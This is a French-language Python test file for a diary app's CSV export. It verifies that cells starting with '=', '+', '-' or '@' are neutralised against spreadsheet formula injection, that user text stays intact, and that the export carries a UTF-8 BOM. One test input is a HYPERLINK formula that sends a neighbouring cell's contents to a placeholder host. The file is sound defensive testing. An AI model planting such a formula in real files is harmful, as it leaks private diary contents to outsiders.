# -*- coding: utf-8 -*-
"""Un journal exporté est un fichier qu'on donne à quelqu'un.

18/09/2026. La page de confidentialité promet la portabilité, et l'écran offre
désormais le lien : l'utilisateur télécharge `lumenia-journal.csv` et le donne à
son psy, à son médecin, à qui il veut. Ce fichier s'ouvre dans Excel ou
LibreOffice.

Or `/journal/export` écrit le contenu des entrées **tel quel**. Une entrée qui
commence par `=`, `+`, `-` ou `@` n'est plus du texte pour un tableur : c'est une
formule, et elle s'exécute à l'ouverture. `=HYPERLINK(...)`, `=WEBSERVICE(...)`,
la cellule peut aller chercher une adresse — en emportant le contenu des cellules
voisines, c'est-à-dire le journal intime de quelqu'un.

Ce n'est pas une attaque tirée par les cheveux ici, et c'est la nature du produit
qui le dit : Lumenia s'adresse à des gens qui écrivent ce qu'ils n'osent pas dire,
et le fichier est fait pour être remis à un tiers. Le tiers ouvre le CSV d'un
inconnu dans Excel. C'est exactement le scénario que l'injection de formule vise.

Le correctif ne censure rien et ne change pas le texte lu par un humain : il
neutralise le **début** de la cellule pour le tableur, avec l'apostrophe que
tous deux comprennent comme « ceci est du texte ». Ce que l'utilisateur a écrit
reste intégralement dans le fichier.
"""
import csv
import io

from fastapi.testclient import TestClient

from app.main import app

client = TestClient(app)

# Les amorces qu'un tableur interprete comme une formule.
AMORCES = ["=", "+", "-", "@"]


def _exporte(titre: str, contenu: str) -> list[list[str]]:
    client.post("/journal", json={"title": titre, "content": contenu})
    texte = client.get("/journal/export").content.decode("utf-8-sig")
    return list(csv.reader(io.StringIO(texte)))


def test_le_crible_lit_bien_un_export():
    """Témoin : sans lui, une route cassée rendrait tout le reste vert sur du vide."""
    lignes = _exporte("note", "texte ordinaire")

    assert lignes[0] == ["id", "title", "content", "created_at"]
    assert any("texte ordinaire" in l[2] for l in lignes[1:]), lignes


def test_aucune_cellule_ne_commence_par_une_formule():
    dangereux = '=HYPERLINK("http://exemple.invalid/?f="&A1,"clique ici")'
    lignes = _exporte("=1+1", dangereux)

    cellules = [c for ligne in lignes[1:] for c in ligne]
    formules = [c for c in cellules if c[:1] in AMORCES]

    assert formules == [], (
        f"ces cellules s'executeront a l'ouverture du fichier dans un tableur : {formules}. "
        "Le CSV du journal est fait pour etre remis a un tiers — un psy qui l'ouvre dans Excel "
        "execute alors une formule ecrite dans le journal intime de quelqu'un"
    )


def test_le_texte_de_l_utilisateur_reste_entier():
    """L'autre sens : neutraliser ne doit pas amputer ce qu'il a ecrit."""
    ecrit = "=1+1 et la suite de ma phrase"
    lignes = _exporte("titre", ecrit)

    contenus = [l[2] for l in lignes[1:]]
    assert any(ecrit in c for c in contenus), (
        f"le texte d'origine a ete abime : {contenus}. La neutralisation prefixe, elle ne coupe pas"
    )


def test_un_accent_s_ouvre_correctement_dans_un_tableur():
    """Excel lit un CSV en codage local s'il n'y a pas de BOM : « café » devient « cafÃ© »."""
    lignes = _exporte("journée", "j'ai réussi à sortir, café avec Léa")

    brut = client.get("/journal/export").content
    assert brut.startswith(b"\xef\xbb\xbf"), (
        "l'export ne porte pas de BOM UTF-8 : ouvert dans Excel, tout le journal d'une "
        "personne francophone s'affiche en mojibake"
    )
    assert any("café" in l[2] for l in lignes[1:]), lignes
